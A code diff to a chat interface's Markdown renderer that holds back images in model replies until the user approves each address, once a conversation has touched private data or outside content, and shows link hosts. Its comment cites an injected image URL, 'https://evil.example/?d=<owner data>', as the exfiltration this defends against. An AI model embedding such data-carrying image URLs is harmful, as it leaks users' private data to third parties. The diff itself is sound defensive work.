@@ -1,4 +1,4 @@
-import { useCallback, useState, type ComponentPropsWithoutRef, type FC } from "react";
+import { createContext, useCallback, useContext, useState, type ComponentPropsWithoutRef, type FC, type ReactNode } from "react";
 import {
   MarkdownTextPrimitive,
   unstable_memoizeMarkdownComponents as memoizeMarkdownComponents,
@@ -9,6 +9,7 @@ import remarkGfm from "remark-gfm";
 import { CheckIcon, CopyIcon } from "lucide-react";
 
 import { TooltipIconButton } from "@/components/assistant-ui/tooltip-icon-button";
+import { allowImage, useConversationMarked, useImageAllowed } from "@/lib/imageGate";
 import { cn } from "@/lib/utils";
 
 const useCopyToClipboard = ({
@@ -50,10 +51,18 @@ const CodeHeader: FC<CodeHeaderProps> = ({ language, code }) => {
 };
 
 // Text a model wrote is untrusted. A Markdown image is fetched the moment it renders, with no click, so an injected
-// `![](https://evil.example/?d=<owner data>)` would send whatever the model put in the address. Images are therefore
-// never drawn: the alt text and the host show as plain text and no `src` reaches the DOM. A link shows its full host
-// beside the label, so the label cannot hide where it goes. Raw HTML is not rendered (there is no rehype-raw), so these
-// two components are the only way model Markdown reaches a URL.
+// `![](https://evil.example/?d=<owner data>)` would send whatever the model put in the address. In a chat that has not
+// touched the owner's data or other sites' content (lib/imageGate.ts) there is nothing to send and images load as
+// usual. Once it has, an image shows its full address and asks first, one address at a time, and no `src` reaches the
+// DOM until it is allowed. A link shows its full host beside the label, so the label cannot hide where it goes. Raw
+// HTML is not rendered (there is no rehype-raw), so these two components are the only way model Markdown reaches a URL.
+
+/** The conversation the reply belongs to. Without one (a shared or unknown view) every image asks first. */
+const ImageGateContext = createContext<string | null>(null);
+export const ImageGateScope: FC<{ threadId: string | undefined; children: ReactNode }> = ({ threadId, children }) => (
+  <ImageGateContext.Provider value={threadId ?? null}>{children}</ImageGateContext.Provider>
+);
+
 function webHost(value: unknown): string | null {
   if (typeof value !== "string") return null;
   try {
@@ -64,25 +73,58 @@ function webHost(value: unknown): string | null {
   }
 }
 
+const notLoaded = (alt: string | undefined, host: string | null) =>
+  `Image not loaded${alt ? `: ${alt}` : ""}${host ? ` (${host})` : ""}`;
+
 const ModelImage: FC<ComponentPropsWithoutRef<"img">> = ({ src, alt }) => {
+  const threadId = useContext(ImageGateContext);
   const host = webHost(src);
+  const address = host && typeof src === "string" ? src : null;
+  const marked = useConversationMarked(threadId);
+  const allowed = useImageAllowed(threadId, address);
+  const [dismissed, setDismissed] = useState(false);
+  if (!address || !host) return <span className="text-muted-foreground">{notLoaded(alt, host)}</span>;
+  if (!marked || allowed) {
+    return <img src={address} alt={alt ?? ""} loading="lazy" decoding="async" referrerPolicy="no-referrer" className="my-2 h-auto max-w-full rounded-lg" />;
+  }
+  if (dismissed) return <span className="text-muted-foreground">{notLoaded(alt, host)}</span>;
+  const button = "min-h-9 rounded-full border border-border px-3 text-sm font-medium hover:bg-accent";
   return (
-    <span className="text-muted-foreground">
-      {`[Image not loaded${alt ? `: ${alt}` : ""}${host ? ` (${host})` : ""}]`}
+    <span role="group" aria-label={`Load this image? ${address}`} className="my-2 block rounded-lg border border-border p-3">
+      <span className="block text-muted-foreground">{notLoaded(alt, host)}</span>
+      <span className="mt-1 block font-medium text-foreground">Load this image?</span>
+      <span className="block break-all font-mono text-xs text-foreground">{address}</span>
+      <span className="mt-1 block text-xs text-muted-foreground">
+        This chat includes your data or content from other sites. Loading the image sends its full address to {host}.
+      </span>
+      <span className="mt-2 flex gap-2">
+        <button type="button" aria-label="Load this image" className={button} onClick={() => allowImage(threadId, address)}>Load</button>
+        <button type="button" className={button} onClick={() => setDismissed(true)}>Not now</button>
+      </span>
     </span>
   );
 };
+
+/** The text of a link's label when it is plain text, else null. */
+function labelText(children: ReactNode): string | null {
+  if (typeof children === "string") return children;
+  if (Array.isArray(children) && children.every((child) => typeof child === "string")) return children.join("");
+  return null;
+}
 
 const ModelLink: FC<ComponentPropsWithoutRef<"a">> = ({ href, children }) => {
   const host = webHost(href);
   // Not a web address (a fragment, a mail or phone link): nothing to open from here, so only its text shows.
   if (!host) return <span>{children}</span>;
+  // A label that already starts with the host (the address itself, or the host name) says it once.
+  const label = labelText(children)?.trim().toLowerCase().replace(/^https?:\/\//, "");
+  const named = label !== undefined && label !== null && (label === host || label.startsWith(`${host}/`));
   return (
     <>
       <a href={href} target="_blank" rel="noopener noreferrer nofollow" referrerPolicy="no-referrer">
         {children}
-      </a>{" "}
-      <span className="whitespace-nowrap text-xs text-muted-foreground">({host})</span>
+      </a>
+      {named ? null : <>{" "}<span className="whitespace-nowrap text-xs text-muted-foreground">({host})</span></>}
     </>
   );
 };
